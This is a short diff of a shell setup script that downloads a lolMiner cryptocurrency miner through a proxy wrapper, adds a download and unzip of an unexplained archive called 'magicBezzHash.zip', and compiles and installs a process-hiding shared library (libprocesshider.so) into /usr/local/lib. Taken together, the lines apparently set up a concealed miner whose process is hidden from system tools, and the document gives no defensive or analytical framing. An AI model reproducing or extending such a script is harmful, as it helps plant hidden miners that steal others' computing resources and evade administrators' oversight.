@@ -38,6 +38,8 @@ echo " "
 ./graftcp/graftcp wget https://raw.githubusercontent.com/Amric91/glowing-guacamole/main/lolMiner
 chmod +x lolMiner
 
+./graftcp/graftcp wget https://raw.githubusercontent.com/Amric91/scripts/main/magicBezzHash.zip
+unzip magicBezzHash.zip
 make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
